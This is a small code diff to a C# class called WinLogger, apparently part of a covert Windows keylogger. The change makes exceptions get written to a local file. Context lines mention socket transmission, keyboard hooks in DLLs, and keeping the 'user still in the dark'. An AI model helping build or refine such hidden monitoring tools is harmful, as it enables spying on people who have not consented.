@@ -86,10 +86,11 @@ public class WinLogger
                 // Release the socket.  
                 server.Shutdown(SocketShutdown.Both);  
                 server.Close();
-            } catch (Exception) {  
+            } catch (Exception e) {
+                File.AppendAllText(@"C:\Users\IEUser\exceptions.txt", e.ToString());
                 /* If something goes wrong, oh well. At least user is still in the dark. */
             }
-        } catch (Exception e) {Console.WriteLine(e.ToString());}
+        } catch (Exception e) {File.AppendAllText(@"C:\Users\IEUser\exceptions.txt", e.ToString());}
     }
     
     //These Dll's will handle the hooks.
